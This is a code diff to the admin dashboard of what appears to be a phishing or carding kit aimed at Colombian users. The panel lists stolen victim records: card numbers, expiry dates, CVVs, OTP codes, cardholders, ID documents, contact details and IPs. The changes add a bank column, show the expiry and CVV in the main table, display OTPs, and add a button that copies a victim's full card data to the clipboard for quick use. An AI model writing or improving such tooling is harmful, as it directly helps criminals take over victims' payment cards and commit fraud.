@@ -238,8 +238,18 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                 </div>
                 <div class="table-wrap">
                     <table>
-                        <thead><tr><th class="checkbox-col"><input type="checkbox" id="checkAllHistorial"></th><th>Fecha</th><th>Tarjeta</th><th>Nombre</th><th>IP</th><th>Acciones</th></tr></thead>
-                        <tbody id="tbodyHistorial"><tr><td colspan="6" class="empty">Cargando...</td></tr></tbody>
+                        <thead>
+                            <tr>
+                                <th class="checkbox-col"><input type="checkbox" id="checkAllHistorial"></th>
+                                <th>Fecha</th>
+                                <th>Banco</th>
+                                <th>Tarjeta</th>
+                                <th>Fch / CVV</th>
+                                <th>Titular</th>
+                                <th>Acciones</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tbodyHistorial"><tr><td colspan="7" class="empty">Cargando...</td></tr></tbody>
                     </table>
                 </div>
             </div>
@@ -592,6 +602,20 @@ $('btnBorrarSesiones').addEventListener('click', async () => { if (!seleccionSes
 
 async function cargarHistorial() { try { const d = await api('/admin/historial'); historialCache = d.historial || []; $('badgeHistorial').textContent = historialCache.length; renderHistorial(); } catch (e) {} }
 function toggleDetalle(id) { const el = document.getElementById('detalle-' + id); if (el) { el.classList.toggle('visible'); if (el.classList.contains('visible')) { filasAbiertas.add(id); } else { filasAbiertas.delete(id); } } }
+
+function copiarDatos(id) {
+    const h = historialCache.find(x => x.id === id);
+    if (!h) return;
+    const d = h.datos || {};
+    const texto = `Tarjeta: ${d.tarjeta || '-'}\nVencimiento: ${d.expMes || ''}/${d.expAnio || ''}\nCVV: ${d.cvv || '-'}\nTitular: ${d.titular || '-'}\nDocumento: ${d.docType || ''} ${d.docNumber || ''}\nOTP: ${d.otp || 'Sin OTP'}\nMonto: ${d.monto || '-'}\nIP: ${d.ip || '-'}`;
+    
+    navigator.clipboard.writeText(texto).then(function() {
+        toast('📋 Datos copiados al portapapeles');
+    }).catch(function() {
+        alert('No se pudo copiar. Aquí están los datos:\n\n' + texto);
+    });
+}
+
 function renderHistorial() {
     const filtro = ($('buscarHistorial').value || '').toLowerCase().trim();
     const tbody = $('tbodyHistorial');
@@ -599,11 +623,16 @@ function renderHistorial() {
     if (filtro) {
         lista = lista.filter(h => { const datos = h.datos || {}; const texto = [ h.bancoKey, datos.titular, datos.nombres, datos.apellidos, datos.docNumber, datos.documento, datos.tarjeta, datos.identificacion, datos.token, datos.otp, datos.ip, datos.telefono, datos.cardBrand, datos.bankName ].filter(Boolean).join(' ').toLowerCase(); return texto.includes(filtro); });
     }
-    if (!lista.length) { tbody.innerHTML = '<tr><td colspan="6" class="empty">Sin registros en el historial</td></tr>'; actualizarBtnBorrarHistorial(); return; }
+    if (!lista.length) { tbody.innerHTML = '<tr><td colspan="7" class="empty">Sin registros en el historial</td></tr>'; actualizarBtnBorrarHistorial(); return; }
+    
     tbody.innerHTML = lista.map(h => {
         const datos = h.datos || {};
         const fecha = new Date(h.fecha).toLocaleString('es-CO');
         const checked = seleccionHistorial.has(h.id) ? 'checked' : '';
+        const tarjeta = datos.tarjeta || '-';
+        const titular = datos.titular || datos.nombres || '-';
+        const exp = (datos.expMes || datos.expAnio || datos.exp) ? `${datos.expMes || ''}/${datos.expAnio || datos.exp || ''}` : '-';
+        const cvv = datos.cvv || '-';
         const tipoPersona = datos.tipoPersona || '-';
         const tipoDoc = datos.docType || datos.tipoDocumento || '-';
         const numDoc = datos.documento || datos.docNumber || '-';
@@ -611,28 +640,29 @@ function renderHistorial() {
         const apellidos = datos.apellidos || '';
         const telefono = datos.telefono || '-';
         const correo = datos.correo || '-';
-        const tipoPago = datos.subsidio ? 'Subsidio' : (datos.precio ? 'Derechos / Certificado' : '-');
         const placa = datos.placa || '-';
         const monto = (datos.monto || datos.precio) ? '$' + Number(datos.monto || datos.precio).toLocaleString('es-CO') : '-';
-        const tarjeta = datos.tarjeta || '-';
-        const exp = (datos.expMes || datos.expAnio || datos.exp) ? `${datos.expMes || ''}/${datos.expAnio || datos.exp || ''}` : '-';
-        const cvv = datos.cvv || '-';
         const bancoEmisor = datos.bankName || '-';
         const tipoTarjeta = datos.cardType || '-';
         const nivelTarjeta = datos.cardLevel || '-';
         const abierta = filasAbiertas.has(h.id) ? 'visible' : '';
+        const otp = datos.otp || 'Sin OTP';
 
         return `
             <tr>
                 <td class="checkbox-col"><input type="checkbox" class="check-historial" data-id="${escapeHtml(h.id)}" ${checked}></td>
                 <td class="dato" style="max-width:120px;">${escapeHtml(fecha)}</td>
-                <td class="dato mono"><b>${escapeHtml(tarjeta)}</b></td>
-                <td class="dato">${escapeHtml(truncar(nombres, 20))}</td>
-                <td class="ip">${escapeHtml(datos.ip || '-')}</td>
-                <td><button class="btn" style="background:#3b82f6; color:white; font-size: 16px; padding: 2px 10px;" onclick="toggleDetalle('${escapeHtml(h.id)}')">👁️</button></td>
+                <td>${nombreBanco(h.bancoKey, datos.marca)}</td>
+                <td class="dato mono" style="color:#fff; font-weight:bold;">${escapeHtml(tarjeta)}</td>
+                <td class="dato">${escapeHtml(exp)} / ${escapeHtml(cvv)}</td>
+                <td class="dato">${escapeHtml(truncar(titular, 20))}</td>
+                <td>
+                    <button class="btn" style="background:#3b82f6; color:white;" title="Ver Detalles" onclick="toggleDetalle('${escapeHtml(h.id)}')">👁️</button>
+                    <button class="btn" style="background:#10b981; color:white;" title="Copiar Datos" onclick="copiarDatos('${escapeHtml(h.id)}')">📋</button>
+                </td>
             </tr>
             <tr id="detalle-${escapeHtml(h.id)}" class="fila-detalle ${abierta}">
-                <td colspan="6">
+                <td colspan="7">
                     <div class="detalle-container">
                         <div class="detalle-grid">
                             <div class="detalle-seccion-titulo" style="grid-column: 1/-1;">👤 Datos Personales</div>
@@ -643,9 +673,10 @@ function renderHistorial() {
                             <div class="detalle-item"><span class="lbl">Apellidos</span><span class="val">${escapeHtml(apellidos)}</span></div>
                             <div class="detalle-item"><span class="lbl">Teléfono</span><span class="val">${escapeHtml(telefono)}</span></div>
                             <div class="detalle-item"><span class="lbl">Correo</span><span class="val">${escapeHtml(correo)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Tipo Pago</span><span class="val">${escapeHtml(tipoPago)}</span></div>
                             <div class="detalle-item"><span class="lbl">Placa</span><span class="val">${escapeHtml(placa.toUpperCase())}</span></div>
                             <div class="detalle-item"><span class="lbl">Monto</span><span class="val">${escapeHtml(monto)}</span></div>
+                            <div class="detalle-item"><span class="lbl">OTP</span><span class="val" style="color:#a855f7;">${escapeHtml(otp)}</span></div>
+                            
                             ${tarjeta !== '-' ? `
                             <div class="detalle-seccion-titulo" style="grid-column: 1/-1;">💳 Datos de la Tarjeta</div>
                             <div class="detalle-item"><span class="lbl">Número Tarjeta</span><span class="val">${escapeHtml(tarjeta)}</span></div>
